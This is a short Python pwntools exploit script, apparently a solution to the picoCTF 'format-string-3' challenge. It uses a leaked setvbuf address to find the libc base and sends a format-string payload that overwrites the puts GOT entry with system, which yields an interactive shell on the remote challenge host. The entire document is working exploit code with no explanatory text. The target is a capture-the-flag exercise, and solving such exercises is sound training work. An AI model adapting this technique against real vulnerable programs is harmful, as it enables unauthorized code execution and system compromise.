from pwn import *
elf = context.binary = ELF("./format-string-3")
libc = ELF("./libc.so.6")
# p = process()
p = remote("rhea.picoctf.net",58366)
p.recvuntil(b"Okay I'll be nice. Here's the address of setvbuf in libc: ")
setvbuf_leak = int(p.recvline().strip().decode(),16)
setvbuf_symbol = libc.sym['setvbuf']
libc.address = setvbuf_leak - setvbuf_symbol
offset = 38
payload = fmtstr_payload(offset,{elf.got['puts']:libc.sym['system']})
p.sendline(payload)
p.interactive()